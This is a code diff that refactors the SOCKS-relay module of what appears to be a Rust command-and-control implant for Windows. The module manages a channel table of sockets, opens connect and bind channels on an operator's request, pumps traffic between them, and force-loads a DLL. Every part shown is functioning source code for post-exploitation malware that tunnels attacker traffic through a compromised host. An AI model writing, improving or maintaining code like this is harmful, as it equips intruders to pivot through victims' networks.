@@ -70,7 +70,11 @@ struct Channel {
 /// it lives in a `static` with no allocation. All access is contained to the
 /// `slot_of`/`add_channel` helpers below, each `unsafe`.
 const MAX_CHANNELS: usize = 16;
-static mut CHANNELS: [Option<Channel>; MAX_CHANNELS] = [None; MAX_CHANNELS];
+/// Channel table wrapped in `UnsafeCell` — all access is single-threaded
+/// beacon context. The `UnsafeCell` is the minimal safe wrapper replacing
+/// the previous `static mut`.
+static CHANNELS: crate::cell::SyncCell<[Option<Channel>; MAX_CHANNELS]> =
+    crate::cell::SyncCell::new([None; MAX_CHANNELS]);
 
 /// Winsock init-once guard. `WSAStartup` is globally reference-counted; calling
 /// it once per process is enough, and we never `WSACleanup` — the implant lives
@@ -144,7 +148,7 @@ unsafe fn ensure_relay() -> Option<&'static RelayFns> {
 /// Index of the channel with id `chan`, if present.
 unsafe fn slot_of(chan: u32) -> Option<usize> {
     for i in 0..MAX_CHANNELS {
-        if let Some(c) = unsafe { CHANNELS[i] } {
+        if let Some(c) = unsafe { (*CHANNELS.get())[i] } {
             if c.chan == chan {
                 return Some(i);
             }
@@ -156,7 +160,7 @@ unsafe fn slot_of(chan: u32) -> Option<usize> {
 /// so that operator data is never sent to a passive listener.
 unsafe fn slot_of_active(chan: u32) -> Option<usize> {
     for i in 0..MAX_CHANNELS {
-        if let Some(c) = unsafe { CHANNELS[i] } {
+        if let Some(c) = unsafe { (*CHANNELS.get())[i] } {
             if c.chan == chan && !c.listening {
                 return Some(i);
             }
@@ -175,14 +179,12 @@ unsafe fn add_channel(chan: u32, sock: usize) -> bool {
 /// BIND listener that pump_channels should accept on).
 unsafe fn add_channel_kind(chan: u32, sock: usize, listening: bool) -> bool {
     for i in 0..MAX_CHANNELS {
-        if unsafe { CHANNELS[i] }.is_none() {
-            unsafe {
-                CHANNELS[i] = Some(Channel {
-                    chan,
-                    sock,
-                    listening,
-                })
-            };
+        if unsafe { (*CHANNELS.get())[i] }.is_none() {
+            unsafe { (*CHANNELS.get())[i] = Some(Channel {
+                chan,
+                sock,
+                listening,
+            }) };
             return true;
         }
     }
@@ -200,7 +202,7 @@ pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
     if proto != 0 {
         return Response::Err({
             let mut e = String::from("connect: unsupported proto ");
-            push_decimal(&mut e, proto as u32);
+            crate::fmt::push_decimal_u32(&mut e, proto as u32);
             e.push_str(" (only TCP=0)");
             e
         });
@@ -211,11 +213,11 @@ pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
     // If a channel with this id is already open (operator reused a chan id),
     // close the old one first rather than leaking the socket.
     if let Some(idx) = unsafe { slot_of(chan) } {
-        if let Some(c) = unsafe { CHANNELS[idx] } {
+        if let Some(c) = unsafe { (*CHANNELS.get())[idx] } {
             if let Some(fns) = unsafe { ensure_relay() } {
                 let _ = unsafe { (fns.closesocket)(c.sock) };
             }
-            unsafe { CHANNELS[idx] = None };
+            unsafe { (*CHANNELS.get())[idx] = None };
         }
     }
 
@@ -369,7 +371,7 @@ pub fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
         2 => do_bind(addr, port, chan),
         other => Response::Err({
             let mut e = String::from("socks: unsupported op ");
-            push_decimal(&mut e, other as u32);
+            crate::fmt::push_decimal_u32(&mut e, other as u32);
             e.push_str(" (connect=1, bind=2)");
             e
         }),
@@ -504,7 +506,7 @@ pub fn channel_data(chan: u32, data: &[u8]) -> Response {
     let Some(idx) = (unsafe { slot_of_active(chan) }) else {
         return Response::Err(String::from("channel_data: unknown channel"));
     };
-    let Some(c) = (unsafe { CHANNELS[idx] }) else {
+    let Some(c) = (unsafe { (*CHANNELS.get())[idx] }) else {
         return Response::Err(String::from("channel_data: unknown channel"));
     };
     // send() may partial-write; loop until all bytes flush or it errors. A
@@ -516,7 +518,7 @@ pub fn channel_data(chan: u32, data: &[u8]) -> Response {
         let n = unsafe { (fns.send)(c.sock, data[sent..].as_ptr(), (data.len() - sent) as i32, 0) };
         if n <= 0 {
             let _ = unsafe { (fns.closesocket)(c.sock) };
-            unsafe { CHANNELS[idx] = None };
+            unsafe { (*CHANNELS.get())[idx] = None };
             return Response::Channel {
                 chan,
                 status: 3,
@@ -533,9 +535,9 @@ pub fn channel_data(chan: u32, data: &[u8]) -> Response {
 pub fn channel_close(chan: u32) -> Response {
     if let Some(fns) = unsafe { ensure_relay() } {
         if let Some(idx) = unsafe { slot_of(chan) } {
-            if let Some(c) = unsafe { CHANNELS[idx] } {
+            if let Some(c) = unsafe { (*CHANNELS.get())[idx] } {
                 let _ = unsafe { (fns.closesocket)(c.sock) };
-                unsafe { CHANNELS[idx] = None };
+                unsafe { (*CHANNELS.get())[idx] = None };
             }
         }
     }
@@ -586,7 +588,7 @@ pub fn pump_channels() -> Vec<Response> {
     let mut buf = [0u8; 4096];
     let mut i = 0;
     while i < MAX_CHANNELS {
-        let entry = unsafe { CHANNELS[i] };
+        let entry = unsafe { (*CHANNELS.get())[i] };
         let Some(c) = entry else {
             i += 1;
             continue;
@@ -625,7 +627,7 @@ pub fn pump_channels() -> Vec<Response> {
         } else if n == 0 {
             // Peer closed the connection cleanly.
             let _ = unsafe { (fns.closesocket)(c.sock) };
-            unsafe { CHANNELS[i] = None };
+            unsafe { (*CHANNELS.get())[i] = None };
             out.push(Response::Channel {
                 chan: c.chan,
                 status: 2,
@@ -639,7 +641,7 @@ pub fn pump_channels() -> Vec<Response> {
                 i += 1;
             } else {
                 let _ = unsafe { (fns.closesocket)(c.sock) };
-                unsafe { CHANNELS[i] = None };
+                unsafe { (*CHANNELS.get())[i] = None };
                 out.push(Response::Channel {
                     chan: c.chan,
                     status: 3,
@@ -668,20 +670,3 @@ fn force_load(dll: &[u8]) -> bool {
     !unsafe { load(name.as_ptr()) }.is_null()
 }
 
-/// Append `v` in decimal to `s` (no `format!`/`to_string` under no_std).
-fn push_decimal(s: &mut String, mut v: u32) {
-    if v == 0 {
-        s.push('0');
-        return;
-    }
-    let mut tmp = [0u8; 10];
-    let mut i = tmp.len();
-    while v != 0 {
-        i -= 1;
-        tmp[i] = b'0' + (v % 10) as u8;
-        v /= 10;
-    }
-    for &b in &tmp[i..] {
-        s.push(b as char);
-    }
-}
